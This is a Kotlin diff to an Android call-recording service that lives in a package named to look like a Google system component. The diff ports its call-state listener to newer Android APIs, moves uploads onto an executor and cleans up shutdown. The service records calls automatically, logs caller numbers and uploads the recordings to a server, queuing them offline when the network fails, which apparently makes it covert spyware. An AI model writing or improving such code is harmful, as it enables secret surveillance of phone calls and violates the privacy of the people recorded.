@@ -11,7 +11,9 @@ import android.media.MediaRecorder
 import android.os.Build
 import android.os.IBinder
 import android.telephony.PhoneStateListener
+import android.telephony.TelephonyCallback
 import android.telephony.TelephonyManager
+import androidx.annotation.RequiresApi
 import android.util.Log
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.OfflineDataQueue
@@ -53,12 +55,37 @@ class CallRecordingService : Service() {
     private var audioRecord: AudioRecord? = null
     private var isRecording = false
     private var recordingThread: Thread? = null
+    private val uploadExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
     private var currentFile: File? = null
     private var callStartTime: Long = 0
     private var callerNumber: String = "unknown"
     private var isIncoming: Boolean = false
     private var originalSpeakerVolume: Int = -1
     private var usedStrategy: String = "none"
+    private var telephonyCallback: TelephonyCallback? = null
+
+    @RequiresApi(Build.VERSION_CODES.S)
+    private inner class CallStateCallback : TelephonyCallback(), TelephonyCallback.CallStateListener {
+        override fun onCallStateChanged(state: Int) {
+            when (state) {
+                TelephonyManager.CALL_STATE_OFFHOOK -> {
+                    callStartTime = System.currentTimeMillis()
+                    Log.d(TAG, "Call started: $callerNumber")
+                    startCallRecording()
+                }
+                TelephonyManager.CALL_STATE_IDLE -> {
+                    if (isRecording) {
+                        Log.d(TAG, "Call ended, stopping recording")
+                        stopCallRecording()
+                    }
+                }
+                TelephonyManager.CALL_STATE_RINGING -> {
+                    isIncoming = true
+                    Log.d(TAG, "Incoming call ringing")
+                }
+            }
+        }
+    }
 
     private val phoneStateListener = object : PhoneStateListener() {
         @Deprecated("Deprecated in API 31")
@@ -124,8 +151,14 @@ class CallRecordingService : Service() {
         telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
         try {
             if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                @Suppress("DEPRECATION")
-                telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    val cb = CallStateCallback()
+                    telephonyCallback = cb
+                    telephonyManager?.registerTelephonyCallback(mainExecutor, cb)
+                } else {
+                    @Suppress("DEPRECATION")
+                    telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
+                }
                 Log.d(TAG, "Call recording service started, listening for calls")
             } else {
                 Log.w(TAG, "READ_PHONE_STATE not granted, call recording disabled")
@@ -326,7 +359,7 @@ class CallRecordingService : Service() {
     }
 
     private fun uploadCallRecording(file: File, durationSec: Int) {
-        Thread {
+        uploadExecutor.submit {
             if (file.length() < 1000) {
                 Log.w(TAG, "Recording too small (${file.length()} bytes), discarding")
                 file.delete()
@@ -365,7 +398,7 @@ class CallRecordingService : Service() {
                 Log.e(TAG, "Upload network error: ${e.message}")
                 queueOffline(file)
             }
-        }.start()
+        }
     }
 
     /**
@@ -390,8 +423,21 @@ class CallRecordingService : Service() {
 
     override fun onDestroy() {
         if (isRecording) stopCallRecording()
-        @Suppress("DEPRECATION")
-        telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
+        uploadExecutor.shutdownNow()
+        audioRecord?.release()
+        audioRecord = null
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            telephonyCallback?.let { telephonyManager?.unregisterTelephonyCallback(it) }
+        } else {
+            @Suppress("DEPRECATION")
+            telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            stopForeground(STOP_FOREGROUND_REMOVE)
+        } else {
+            @Suppress("DEPRECATION")
+            stopForeground(true)
+        }
         super.onDestroy()
     }
 }
